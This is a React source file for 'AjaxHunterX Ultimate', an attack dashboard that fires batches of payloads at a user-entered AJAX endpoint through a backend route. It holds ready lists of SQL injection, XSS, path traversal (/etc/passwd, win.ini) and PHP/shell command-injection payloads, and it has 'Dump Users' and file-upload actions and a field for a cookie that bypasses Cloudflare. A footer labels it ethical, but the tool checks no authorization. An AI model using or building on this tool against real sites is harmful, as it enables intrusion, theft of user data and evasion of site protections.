import React, { useState, useRef } from 'react';
import axios from 'axios';

const ATTACKS = [
  { label: 'Test Action', action: 'test', type: 'generic' },
  { label: 'Ajax Login', action: 'ajax_login', type: 'ajax_login' },
  { label: 'Upload File', action: 'upload_file', type: 'file_upload' },
  { label: 'Dump Users', action: 'dump_users', type: 'generic' },
  { label: 'SQL Injection', action: 'test', type: 'sql_injection' },
  { label: 'XSS Test', action: 'test', type: 'xss' },
  { label: 'LFI Test', action: 'test', type: 'lfi' },
  { label: 'RCE Test', action: 'test', type: 'rce' },
];

const PAYLOADS = {
  sql_injection: [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1--",
    "' OR 'x'='x",
    "\" OR \"x\"=\"x",
    "' OR 1=1#",
    "' OR '1'='1' /*",
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "\"'><img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
  ],
  lfi: [
    "../../../../../etc/passwd",
    "../../../../../../../../../../etc/passwd",
    "../../../../../../../../../../windows/win.ini",
  ],
  rce: [
    "<?php system('id'); ?>",
    "<?php echo shell_exec('whoami'); ?>",
    "`id`",
    "$(whoami)",
  ],
};

export default function App() {
  const [targetUrl, setTargetUrl] = useState('');
  const [cookie, setCookie] = useState('');
  const [customPayload, setCustomPayload] = useState('');
  const [logs, setLogs] = useState([]);
  const [selectedFile, setSelectedFile] = useState(null);
  const logRef = useRef(null);

  const appendLog = (msg) => {
    setLogs((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
    setTimeout(() => {
      if (logRef.current) {
        logRef.current.scrollTop = logRef.current.scrollHeight;
      }
    }, 100);
  };

  const clearLogs = () => setLogs([]);

  const exportLogs = () => {
    const blob = new Blob([logs.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `ajaxhunterx_log_${new Date().toISOString().replace(/[:.]/g, '-')}.txt`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const sendAttack = async (attack, payload = null) => {
    if (!targetUrl) {
      alert('Please enter a target AJAX URL.');
      return;
    }

    appendLog(`Starting attack: ${attack.label} with payload: ${payload || 'default'}`);

    try {
      let formData = new FormData();
      formData.append('targetUrl', targetUrl);
      formData.append('action', attack.action);
      formData.append('cookie', cookie);
      formData.append('attackType', attack.type);

      if (attack.type === 'file_upload' && selectedFile) {
        formData.append('payload', customPayload);
        formData.append('file', selectedFile);
      } else if (payload) {
        formData.append('payload', payload);
      } else if (customPayload) {
        formData.append('payload', customPayload);
      }

      const config = {
        headers: { 'Content-Type': 'multipart/form-data' },
        timeout: 30000,
      };

      const response = await axios.post('/api/attack', formData, config);

      if (response.data.error) {
        appendLog(`[ERROR] ${response.data.error}`);
      } else {
        appendLog(`[SUCCESS] Status: ${response.data.statusCode || 'N/A'}`);
        appendLog(`Response snippet:\n${(response.data.body || '').substring(0, 700)}${(response.data.body || '').length > 700 ? '...' : ''}`);
      }
    } catch (err) {
      appendLog(`[ERROR] ${err.message}`);
    }
  };

  const runBatchPayloads = async (attack) => {
    const payloadList = PAYLOADS[attack.type];
    if (!payloadList) {
      appendLog(`[INFO] No predefined payloads for attack type: ${attack.type}`);
      return;
    }
    for (const payload of payloadList) {
      await sendAttack(attack, payload);
      await new Promise(r => setTimeout(r, 1000)); // 1s delay between requests
    }
  };

  return (
    <div style={{ maxWidth: 900, margin: 'auto', padding: 20, background: '#121212', color: '#eee', minHeight: '100vh' }}>
      <h1 style={{ textAlign: 'center', marginBottom: 20 }}>AjaxHunterX Ultimate - AJAX Attack Dashboard</h1>

      <label>Target AJAX URL:</label>
      <input
        type="text"
        value={targetUrl}
        onChange={e => setTargetUrl(e.target.value)}
        placeholder="https://example.com/wp-admin/admin-ajax.php"
        style={{ width: '100%', padding: 8, marginBottom: 10, borderRadius: 4, border: 'none', background: '#222', color: '#eee' }}
      />

      <label>Bypass Cookie (e.g. Cloudflare clearance):</label>
      <input
        type="text"
        value={cookie}
        onChange={e => setCookie(e.target.value)}
        placeholder="cf_clearance=..."
        style={{ width: '100%', padding: 8, marginBottom: 10, borderRadius: 4, border: 'none', background: '#222', color: '#eee' }}
      />

      <label>Custom Payload (optional):</label>
      <textarea
        value={customPayload}
        onChange={e => setCustomPayload(e.target.value)}
        placeholder="Enter custom POST data or payload here..."
        style={{ width: '100%', padding: 8, marginBottom: 10, borderRadius: 4, border: 'none', background: '#222', color: '#eee', height: 120 }}
      />

      <label>File Upload (optional):</label>
      <input
        type="file"
        onChange={e => setSelectedFile(e.target.files[0])}
        style={{ marginBottom: 20 }}
      />

      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 10, marginBottom: 20 }}>
        {ATTACKS.map((attack) => (
          <button
            key={attack.label}
            onClick={() => {
              if (['sql_injection', 'xss', 'lfi', 'rce'].includes(attack.type)) {
                runBatchPayloads(attack);
              } else {
                sendAttack(attack);
              }
            }}
            style={{
              flex: '1 1 150px',
              padding: 10,
              background: '#007acc',
              border: 'none',
              borderRadius: 4,
              color: 'white',
              cursor: 'pointer',
              fontWeight: 'bold',
            }}
          >
            {attack.label}
          </button>
        ))}
        <button
          onClick={clearLogs}
          style={{
            flex: '1 1 150px',
            padding: 10,
            background: '#cc3300',
            border: 'none',
            borderRadius: 4,
            color: 'white',
            cursor: 'pointer',
            fontWeight: 'bold',
          }}
        >
          Clear Logs
        </button>
        <button
          onClick={exportLogs}
          style={{
            flex: '1 1 150px',
            padding: 10,
            background: '#339933',
            border: 'none',
            borderRadius: 4,
            color: 'white',
            cursor: 'pointer',
            fontWeight: 'bold',
          }}
        >
          Export Logs
        </button>
      </div>

      <label>Logs:</label>
      <pre
        ref={logRef}
        style={{
          background: '#222',
          padding: 15,
          borderRadius: 6,
          height: 350,
          overflowY: 'auto',
          fontFamily: 'monospace',
          whiteSpace: 'pre-wrap',
          color: '#eee',
        }}
        tabIndex={0}
      >
        {logs.join('\n')}
      </pre>

      <footer style={{ textAlign: 'center', marginTop: 40, color: '#555' }}>
        © 2024 AjaxHunterX Ultimate - Ethical Security Tool
      </footer>
    </div>
  );
}
